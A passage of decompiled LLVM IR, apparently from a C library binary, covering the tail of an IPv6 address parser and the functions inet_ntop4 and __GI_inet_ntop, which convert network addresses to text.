  %v0_11710 = load i32, i32* %r7.global-to-local, align 4
  %v3_11710 = udiv i32 %v0_11710, 256
  store i32 %v3_11710, i32* %r2.global-to-local, align 4
  store i32 %v0_11704, i32* %r3.global-to-local, align 4
  %v1_11718 = trunc i32 %v3_11710 to i8
  %v3_11718 = inttoptr i32 %v0_11704 to i8*
  store i8 %v1_11718, i8* %v3_11718, align 1
  %v4_11718 = load i32, i32* %r3.global-to-local, align 4
  %v5_11718 = add i32 %v4_11718, 1
  store i32 %v5_11718, i32* %r3.global-to-local, align 4
  %v0_1171c = load i32, i32* @r6, align 4
  store i32 %v0_1171c, i32* %sl.global-to-local, align 4
  %v0_11720 = load i32, i32* %r7.global-to-local, align 4
  %v1_11720 = trunc i32 %v0_11720 to i8
  %v2_11720 = load i32, i32* @r4, align 4
  %v3_11720 = add i32 %v2_11720, 1
  %v4_11720 = inttoptr i32 %v3_11720 to i8*
  store i8 %v1_11720, i8* %v4_11720, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_11728 = load i32, i32* %r3.global-to-local, align 4
  %v1_11728 = add i32 %v0_11728, 1
  store i32 %v1_11728, i32* @r4, align 4
  %v0_1176c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1176c.backedge

dec_label_pc_11734:                               ; preds = %dec_label_pc_116d0
  %v7_11734 = icmp eq i32 %v0_116d0, 46
  br i1 %v7_11734, label %dec_label_pc_1173c, label %dec_label_pc_11820

dec_label_pc_1173c:                               ; preds = %dec_label_pc_11734
  %v0_1173c = load i32, i32* @r4, align 4
  %v1_1173c = add i32 %v0_1173c, 4
  store i32 %v1_1173c, i32* @r5, align 4
  %v1_11740 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1173c, %v1_11740
  br i1 %tmp39, label %dec_label_pc_11820, label %dec_label_pc_11748

dec_label_pc_11748:                               ; preds = %dec_label_pc_1173c
  %v0_1174c = load i32, i32* %sl.global-to-local, align 4
  %v1_1174c = inttoptr i32 %v0_1174c to i8*
  store i32 %v0_1174c, i32* %r0.global-to-local, align 4
  %v4_11750 = call i32 @inet_pton4(i8* %v1_1174c, i32 %v0_1173c)
  store i32 %v4_11750, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_11750, 1
  br i1 %tmp36, label %dec_label_pc_11820, label %bb

bb:                                               ; preds = %dec_label_pc_11748
  %v5_11758 = load i32, i32* @r5, align 4
  store i32 %v5_11758, i32* @r4, align 4
  br label %dec_label_pc_117a8

dec_label_pc_11764:                               ; preds = %dec_label_pc_116bc
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1176c.backedge

dec_label_pc_1176c.backedge:                      ; preds = %dec_label_pc_11764, %dec_label_pc_116ec, %dec_label_pc_11710
  %v0_1176c = phi i32 [ %v1_116b4, %dec_label_pc_116ec ], [ %v0_1176c.pre, %dec_label_pc_11710 ], [ %v1_116b4, %dec_label_pc_11764 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_116ec ], [ 0, %dec_label_pc_11710 ], [ 1, %dec_label_pc_11764 ]
  %v1_1176c = inttoptr i32 %v0_1176c to i8*
  %v2_1176c = load i8, i8* %v1_1176c, align 1
  %v3_1176c = zext i8 %v2_1176c to i32
  store i32 %v3_1176c, i32* %r0.global-to-local, align 4
  %v1_11770 = call i32 @__GI_tolower(i32 %v3_1176c)
  store i32 %v1_11770, i32* %r0.global-to-local, align 4
  store i32 %v1_11770, i32* @r5, align 4
  %v2_11774 = icmp eq i32 %v1_11770, 0
  br i1 %v2_11774, label %dec_label_pc_1177c, label %dec_label_pc_116a0

dec_label_pc_1177c:                               ; preds = %dec_label_pc_1176c.backedge, %dec_label_pc_1168c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1168c ], [ %stack_var_-56.0.be, %dec_label_pc_1176c.backedge ]
  %v4_1177c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1177c3, i32* %r3.global-to-local, align 4
  %v2_11780 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_117ec.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_11780, label %dec_label_pc_117a8, label %dec_label_pc_11788

dec_label_pc_11788:                               ; preds = %dec_label_pc_1177c
  %v1_11788 = add i32 %v0_117ec.pre.pre, 2
  store i32 %v1_11788, i32* %r3.global-to-local, align 4
  %v1_1178c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_11788, %v1_1178c
  br i1 %tmp40, label %dec_label_pc_11820, label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_11788
  store i32 %v0_117ec.pre.pre, i32* %r3.global-to-local, align 4
  %v0_11798 = load i32, i32* %r7.global-to-local, align 4
  %v3_11798 = udiv i32 %v0_11798, 256
  store i32 %v3_11798, i32* %r2.global-to-local, align 4
  %v1_1179c = trunc i32 %v3_11798 to i8
  %v3_1179c = inttoptr i32 %v0_117ec.pre.pre to i8*
  store i8 %v1_1179c, i8* %v3_1179c, align 1
  %v4_1179c = load i32, i32* %r3.global-to-local, align 4
  %v5_1179c = add i32 %v4_1179c, 1
  store i32 %v5_1179c, i32* %r3.global-to-local, align 4
  %v0_117a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_117a0 = trunc i32 %v0_117a0 to i8
  %v2_117a0 = load i32, i32* @r4, align 4
  %v3_117a0 = add i32 %v2_117a0, 1
  %v4_117a0 = inttoptr i32 %v3_117a0 to i8*
  store i8 %v1_117a0, i8* %v4_117a0, align 1
  %v0_117a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_117a4 = add i32 %v0_117a4, 1
  store i32 %v1_117a4, i32* @r4, align 4
  br label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_1177c, %bb, %dec_label_pc_11794
  %v0_117ec.pre = phi i32 [ %v5_11758, %bb ], [ %v1_117a4, %dec_label_pc_11794 ], [ %v0_117ec.pre.pre, %dec_label_pc_1177c ]
  %v0_117a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_117a8 = icmp eq i32 %v0_117a8, 0
  %v1_117ec.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_117a8, label %dec_label_pc_117ec, label %dec_label_pc_117b0

dec_label_pc_117b0:                               ; preds = %dec_label_pc_117a8
  %v9_117b0 = icmp eq i32 %v0_117ec.pre, %v1_117ec.pre
  %v2_117b4 = sub i32 %v0_117ec.pre, %v0_117a8
  store i32 %v2_117b4, i32* %r0.global-to-local, align 4
  br i1 %v9_117b0, label %dec_label_pc_11820, label %dec_label_pc_117d4.preheader

dec_label_pc_117d4.preheader:                     ; preds = %dec_label_pc_117b0
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_117d4

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117d4
  %v0_117c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_117c4 = add i32 %v0_117c4, %v2_117d8
  %v3_117c4 = inttoptr i32 %v2_117c4 to i8*
  %v4_117c4 = load i8, i8* %v3_117c4, align 1
  %v3_117c8 = inttoptr i32 %v2_117dc to i8*
  store i8 %v4_117c4, i8* %v3_117c8, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_117d0 = load i32, i32* %fp.global-to-local, align 4
  %v3_117d0 = load i32, i32* @ip, align 4
  %v4_117d0 = add i32 %v3_117d0, %v2_117d0
  %v5_117d0 = inttoptr i32 %v4_117d0 to i8*
  store i8 0, i8* %v5_117d0, align 1
  %v0_117d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_117d4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_117dc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_117d4

dec_label_pc_117d4:                               ; preds = %dec_label_pc_117d4.preheader, %dec_label_pc_117c4
  %v0_117e8 = phi i32 [ %v1_117ec.pre, %dec_label_pc_117d4.preheader ], [ %v1_117dc.pre, %dec_label_pc_117c4 ]
  %v1_117d8 = phi i32 [ %v2_117b4, %dec_label_pc_117d4.preheader ], [ %v1_117d4.pre, %dec_label_pc_117c4 ]
  %v0_117e0 = phi i32 [ 1, %dec_label_pc_117d4.preheader ], [ %v0_117d4.pre, %dec_label_pc_117c4 ]
  %v2_117d8 = sub i32 %v1_117d8, %v0_117e0
  store i32 %v2_117d8, i32* @ip, align 4
  %v2_117dc = sub i32 %v0_117e8, %v0_117e0
  store i32 %v2_117dc, i32* @lr, align 4
  %v1_117e0 = add i32 %v0_117e0, 1
  store i32 %v1_117e0, i32* %r2.global-to-local, align 4
  %v7_117e4 = icmp slt i32 %v1_117d8, %v0_117e0
  br i1 %v7_117e4, label %dec_label_pc_117e8, label %dec_label_pc_117c4

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117d4
  store i32 %v0_117e8, i32* @r4, align 4
  br label %dec_label_pc_117ec

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117a8, %dec_label_pc_117e8
  %v0_117ec = phi i32 [ %v0_117e8, %dec_label_pc_117e8 ], [ %v0_117ec.pre, %dec_label_pc_117a8 ]
  %v1_117ec = phi i32 [ %v0_117e8, %dec_label_pc_117e8 ], [ %v1_117ec.pre, %dec_label_pc_117a8 ]
  %v9_117ec = icmp eq i32 %v0_117ec, %v1_117ec
  br i1 %v9_117ec, label %dec_label_pc_117f4, label %dec_label_pc_11820

dec_label_pc_117f4:                               ; preds = %dec_label_pc_117ec
  store i32 16, i32* @r2, align 4
  %v2_117f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_117f8, i32* @r0, align 4
  store i32 %v2_1165c, i32* @r1, align 4
  %v0_11800 = call i32 @memcpy()
  store i32 %v0_11800, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_1180c:                               ; preds = %dec_label_pc_1163c
  %v0_1180c = call i32 @__errno_location()
  store i32 %v0_1180c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_11818 = inttoptr i32 %v0_1180c to i32*
  store i32 97, i32* %v2_11818, align 4
  %v0_11824.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_11820:                               ; preds = %dec_label_pc_116bc, %dec_label_pc_116e4, %dec_label_pc_11704, %dec_label_pc_116f8, %dec_label_pc_11748, %dec_label_pc_117b0, %dec_label_pc_11734, %dec_label_pc_117ec, %dec_label_pc_11680, %dec_label_pc_11788, %dec_label_pc_1173c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_11824:                               ; preds = %dec_label_pc_1180c, %dec_label_pc_117f4, %dec_label_pc_11648, %dec_label_pc_11820
  %v0_11824 = phi i32 [ %v0_11824.pre, %dec_label_pc_1180c ], [ 1, %dec_label_pc_117f4 ], [ %v4_11650, %dec_label_pc_11648 ], [ 0, %dec_label_pc_11820 ]
  store i32 %v0_11824, i32* %r0.global-to-local, align 4
  store i32 %v3_11624, i32* @r4, align 4
  store i32 %v6_11624, i32* @r5, align 4
  store i32 %v9_11624, i32* @r6, align 4
  ret i32 %v0_11824

; uselistorder directives
  uselistorder i32 %v0_11824, { 1, 0 }
  uselistorder i32 %v2_117dc, { 1, 0 }
  uselistorder i32 %v2_117d8, { 1, 0 }
  uselistorder i32 %v0_117e0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_117e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_117ec.pre, { 0, 2, 1 }
  uselistorder i32 %v0_117ec.pre, { 2, 0, 1 }
  uselistorder i32 %v3_11798, { 1, 0 }
  uselistorder i32 %v0_117ec.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_11770, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1174c, { 1, 0 }
  uselistorder i32 %v3_11710, { 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0, 2 }
  uselistorder i32 %v1_116b4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_116ac, { 1, 0 }
  uselistorder i32 %v0_11690, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 15, 14, 17, 16, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_11824, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11820, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_117ec, { 1, 0 }
  uselistorder label %dec_label_pc_117d4, { 1, 0 }
  uselistorder label %dec_label_pc_117a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1176c.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_116a0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11834 = load i32, i32* @r4, align 4
  store i32 %v3_11834, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_14a18.738 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_11850 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_11850, i32* @r0, align 4
  %v0_11854 = call i32 @memcpy()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_11864 = bitcast i32* %stack_var_-51 to i8*
  %v3_11864 = call i32 @__GI_memset(i8* %v2_11864, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1192c = ptrtoint i32* %stack_var_-36 to i32
  %v2_11908 = add i32 %v2_1192c, -17
  br label %dec_label_pc_1192c

dec_label_pc_11874:                               ; preds = %dec_label_pc_1192c
  %v0_11874 = load i32, i32* %fp.global-to-local, align 4
  %v2_11874 = add i32 %v0_11874, %v1_11874
  %v3_11874 = inttoptr i32 %v2_11874 to i8*
  %v4_11874 = load i8, i8* %v3_11874, align 1
  %v6_11874 = zext i8 %v4_11874 to i32
  store i32 %v6_11874, i32* %r4.global-to-local, align 4
  %v1_11878 = add i32 %v0_11878, 1
  store i32 %v1_11878, i32* %r7.global-to-local, align 4
  store i32 %v2_1192c, i32* %r2.global-to-local, align 4
  %v2_11884 = add i32 %v1_11878, %v2_1192c
  store i32 %v2_11884, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_11874, 100
  %v1_1188c = or i8 %div, 48
  %v3_11890 = add i32 %v2_1193c, -17
  %v4_11890 = inttoptr i32 %v3_11890 to i8*
  store i8 %v1_1188c, i8* %v4_11890, align 1
  %v0_11894 = load i32, i32* %r5.global-to-local, align 4
  %v1_11894 = add i32 %v0_11894, -17
  %v2_11894 = inttoptr i32 %v1_11894 to i8*
  %v3_11894 = load i8, i8* %v2_11894, align 1
  %v7_11898 = icmp eq i8 %v3_11894, 48
  %v0_1189c = load i32, i32* %fp.global-to-local, align 4
  %v1_1189c = load i32, i32* %r8.global-to-local, align 4
  %v2_1189c = add i32 %v1_1189c, %v0_1189c
  store i32 %v2_1189c, i32* %sb.global-to-local, align 4
  %v0_118a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_118ac = udiv i32 %v0_118a4, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_118b4 = urem i32 %v2_118ac, 256
  %v2_118b8 = urem i32 %v1_118b4, 10
  %v1_118bc = or i32 %v2_118b8, 48
  %v1_118c0 = trunc i32 %v1_118bc to i8
  br i1 %v7_11898, label %dec_label_pc_118ac, label %dec_label_pc_118d4

dec_label_pc_118ac:                               ; preds = %dec_label_pc_11874
  store i8 %v1_118c0, i8* %v2_11894, align 1
  %v0_118c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_118c4 = add i32 %v0_118c4, -17
  %v2_118c4 = inttoptr i32 %v1_118c4 to i8*
  %v3_118c4 = load i8, i8* %v2_118c4, align 1
  %v7_118c8 = icmp eq i8 %v3_118c4, 48
  br i1 %v7_118c8, label %dec_label_pc_118ac.dec_label_pc_118f8_crit_edge, label %bb

dec_label_pc_118ac.dec_label_pc_118f8_crit_edge:  ; preds = %dec_label_pc_118ac
  %v1_11908.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118f8

bb:                                               ; preds = %dec_label_pc_118ac
  %v1_118cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_118cc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118f8

dec_label_pc_118d4:                               ; preds = %dec_label_pc_11874
  %v2_118f0 = load i32, i32* %sl.global-to-local, align 4
  %v3_118f0 = add i32 %v2_118f0, -17
  %v4_118f0 = inttoptr i32 %v3_118f0 to i8*
  store i8 %v1_118c0, i8* %v4_118f0, align 1
  %v0_118f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_118f4 = add i32 %v0_118f4, 1
  store i32 %v1_118f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118ac.dec_label_pc_118f8_crit_edge, %bb, %dec_label_pc_118d4
  %v1_11908 = phi i32 [ %v1_11908.pre, %dec_label_pc_118ac.dec_label_pc_118f8_crit_edge ], [ %v1_118cc, %bb ], [ %v1_118f4, %dec_label_pc_118d4 ]
  %v0_118f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_118f8 = inttoptr i32 %v0_118f8 to i8*
  %v2_118f8 = load i8, i8* %v1_118f8, align 1
  %tmp17 = urem i8 %v2_118f8, 10
  store i32 %v2_1192c, i32* %ip.global-to-local, align 4
  %v1_1190c = add i32 %v1_11908, 1
  store i32 %v1_1190c, i32* %r1.global-to-local, align 4
  %v1_11910 = or i8 %tmp17, 48
  %v3_11914 = add i32 %v2_11908, %v1_11908
  %v4_11914 = inttoptr i32 %v3_11914 to i8*
  store i8 %v1_11910, i8* %v4_11914, align 1
  %v0_11918 = load i32, i32* %ip.global-to-local, align 4
  %v1_11918 = load i32, i32* %r1.global-to-local, align 4
  %v2_11918 = add i32 %v1_11918, %v0_11918
  store i32 %v2_11918, i32* %r2.global-to-local, align 4
  %v3_11920 = add i32 %v2_11918, -17
  %v4_11920 = inttoptr i32 %v3_11920 to i8*
  store i8 46, i8* %v4_11920, align 1
  %v0_11924 = load i32, i32* %r8.global-to-local, align 4
  %v1_11924 = add i32 %v0_11924, 1
  store i32 %v1_11924, i32* %r8.global-to-local, align 4
  %v0_11928 = load i32, i32* %r1.global-to-local, align 4
  %v1_11928 = add i32 %v0_11928, 1
  br label %dec_label_pc_1192c

dec_label_pc_1192c:                               ; preds = %entry, %dec_label_pc_118f8
  %v0_11878 = phi i32 [ 0, %entry ], [ %v1_11928, %dec_label_pc_118f8 ]
  %v1_11874 = phi i32 [ 0, %entry ], [ %v1_11924, %dec_label_pc_118f8 ]
  store i32 %v2_1192c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_11878, i32* %r6.global-to-local, align 4
  %v2_1193c = add i32 %v0_11878, %v2_1192c
  store i32 %v2_1193c, i32* %r5.global-to-local, align 4
  %v7_11940 = icmp sgt i32 %v1_11874, 3
  br i1 %v7_11940, label %dec_label_pc_11944, label %dec_label_pc_11874

dec_label_pc_11944:                               ; preds = %dec_label_pc_1192c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_11850, i32* %r4.global-to-local, align 4
  %v3_1194c = add i32 %v2_1193c, -18
  %v4_1194c = inttoptr i32 %v3_1194c to i8*
  store i8 0, i8* %v4_1194c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_11954 = call i32 @strlen(i8* %tmp18)
  %v2_11958 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_11954, %v2_11958
  br i1 %tmp, label %dec_label_pc_11964, label %dec_label_pc_11978

dec_label_pc_11964:                               ; preds = %dec_label_pc_11944
  %v0_11964 = call i32 @__errno_location()
  %v0_1196c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1196c, i32* %r2.global-to-local, align 4
  %v2_11970 = inttoptr i32 %v0_11964 to i32*
  store i32 28, i32* %v2_11970, align 4
  %v0_11988.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11988

dec_label_pc_11978:                               ; preds = %dec_label_pc_11944
  store i32 %v2_11850, i32* %r1.global-to-local, align 4
  %v3_11980 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_11980, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11988

dec_label_pc_11988:                               ; preds = %dec_label_pc_11964, %dec_label_pc_11978
  %v0_11988 = phi i32 [ %v0_11988.pre, %dec_label_pc_11964 ], [ %v3_11980, %dec_label_pc_11978 ]
  %v2_11990 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11990, i32* @r4, align 4
  ret i32 %v0_11988

; uselistorder directives
  uselistorder i32 %v2_1193c, { 0, 2, 1 }
  uselistorder i32 %v1_11874, { 1, 0 }
  uselistorder i32 %v0_11878, { 0, 2, 1 }
  uselistorder i32 %v2_1192c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 6, 2, 3, 4, 5, 7, 0 }
  uselistorder i8 10, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i8 48, { 0, 5, 6, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 -17, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder label %dec_label_pc_11988, { 1, 0 }
  uselistorder label %dec_label_pc_1192c, { 1, 0 }
  uselistorder label %dec_label_pc_118f8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-110 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11998 = load i32, i32* @r4, align 4
  store i32 %v3_11998, i32* %stack_var_-32, align 4
  %v6_11998 = load i32, i32* @r5, align 4
  %v25_11998 = ptrtoint i32* %stack_var_-32 to i32
  %v7_1199c = icmp eq i32 %arg1, 2
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @sb, align 4
  store i32 %arg4, i32* @sl, align 4
  br i1 %v7_1199c, label %dec_label_pc_119c0, label %dec_label_pc_119b4

dec_label_pc_119b4:                               ; preds = %entry
  %v7_119b4 = icmp eq i32 %arg1, 10
  br i1 %v7_119b4, label %dec_label_pc_119d4, label %dec_label_pc_11bd4

dec_label_pc_119c0:                               ; preds = %entry
  store i32 %arg3, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_119cc = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_11bcc

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119b4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_119e0 = bitcast i32* %stack_var_-64 to i8*
  %v3_119e0 = call i32 @__GI_memset(i8* %v2_119e0, i32 0)
  br label %dec_label_pc_11a00

dec_label_pc_119ec:                               ; preds = %dec_label_pc_11a00
  %tmp68 = icmp slt i32 %v1_119f0, 0
  %v4_11a00 = zext i1 %tmp68 to i32
  %v5_11a00 = add i32 %v4_11a00, %v1_119f0
  %v3_11a04 = sdiv i32 %v5_11a00, 2
  %v4_11a14 = mul i32 %v3_11a04, 4
  %v5_11a14 = add i32 %v4_11a14, %v25_11998
  %v1_119ec = add i32 %v2_11a10, 1
  %v2_119ec = inttoptr i32 %v1_119ec to i8*
  %v3_119ec = load i8, i8* %v2_119ec, align 1
  %v4_119ec = zext i8 %v3_119ec to i32
  %v3_119f0 = inttoptr i32 %v2_11a10 to i8*
  %v4_119f0 = load i8, i8* %v3_119f0, align 1
  %v6_119f0 = zext i8 %v4_119f0 to i32
  store i32 %v6_119f0, i32* %r2.global-to-local, align 4
  %v4_119f4 = mul nuw nsw i32 %v6_119f0, 256
  %v5_119f4 = or i32 %v4_119f4, %v4_119ec
  %v2_119f8 = add i32 %v5_11a14, -32
  %v3_119f8 = inttoptr i32 %v2_119f8 to i32*
  store i32 %v5_119f4, i32* %v3_119f8, align 4
  %v0_119fc = load i32, i32* %r1.global-to-local, align 4
  %v1_119fc = add i32 %v0_119fc, 2
  br label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119d4, %dec_label_pc_119ec
  %v1_119f0 = phi i32 [ 0, %dec_label_pc_119d4 ], [ %v1_119fc, %dec_label_pc_119ec ]
  store i32 %v1_119f0, i32* %r1.global-to-local, align 4
  %v0_11a10 = load i32, i32* @r8, align 4
  %v2_11a10 = add i32 %v0_11a10, %v1_119f0
  store i32 %v2_11a10, i32* %r2.global-to-local, align 4
  %v7_11a18 = icmp sgt i32 %v1_119f0, 15
  br i1 %v7_11a18, label %dec_label_pc_11a1c, label %dec_label_pc_119ec

dec_label_pc_11a1c:                               ; preds = %dec_label_pc_11a00
  store i32 -1, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11a2c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_11a1c, %dec_label_pc_11a78
  %v0_11a6c = phi i32 [ -1, %dec_label_pc_11a1c ], [ %v0_11aa0, %dec_label_pc_11a78 ]
  %v0_11a5c = phi i32 [ -1, %dec_label_pc_11a1c ], [ %v0_11a8c, %dec_label_pc_11a78 ]
  %v0_11a40 = phi i32 [ -1, %dec_label_pc_11a1c ], [ %v0_11a408, %dec_label_pc_11a78 ]
  %v0_11a78 = phi i32 [ 0, %dec_label_pc_11a1c ], [ %v1_11a78, %dec_label_pc_11a78 ]
  %v4_11a30 = mul nuw nsw i32 %v0_11a78, 4
  %v5_11a30 = add i32 %v4_11a30, %v25_11998
  %v1_11a34 = add i32 %v5_11a30, -32
  %v2_11a34 = inttoptr i32 %v1_11a34 to i32*
  %v3_11a34 = load i32, i32* %v2_11a34, align 4
  %v2_11a38 = icmp eq i32 %v3_11a34, 0
  %v7_11a40 = icmp eq i32 %v0_11a40, -1
  br i1 %v2_11a38, label %dec_label_pc_11a40, label %dec_label_pc_11a54

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a2c
  br i1 %v7_11a40, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a40
  store i32 %v0_11a78, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_11a78

.thread:                                          ; preds = %dec_label_pc_11a40
  %v1_11a4c.pre = load i32, i32* @r4, align 4
  %v2_11a4c = add i32 %v1_11a4c.pre, 1
  store i32 %v2_11a4c, i32* @r4, align 4
  br label %dec_label_pc_11a78

dec_label_pc_11a54:                               ; preds = %dec_label_pc_11a2c
  br i1 %v7_11a40, label %dec_label_pc_11a78, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a54
  %v7_11a5c = icmp eq i32 %v0_11a5c, -1
  %v0_11a70.pre = load i32, i32* @r4, align 4
  %v1_11a64 = load i32, i32* @r7, align 4
  %v7_11a68 = icmp sgt i32 %v0_11a70.pre, %v1_11a64
  %or.cond = or i1 %v7_11a5c, %v7_11a68
  br i1 %or.cond, label %dec_label_pc_11a6c, label %dec_label_pc_11a74

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a5c
  store i32 %v0_11a6c, i32* @r6, align 4
  store i32 %v0_11a70.pre, i32* @r7, align 4
  br label %dec_label_pc_11a74

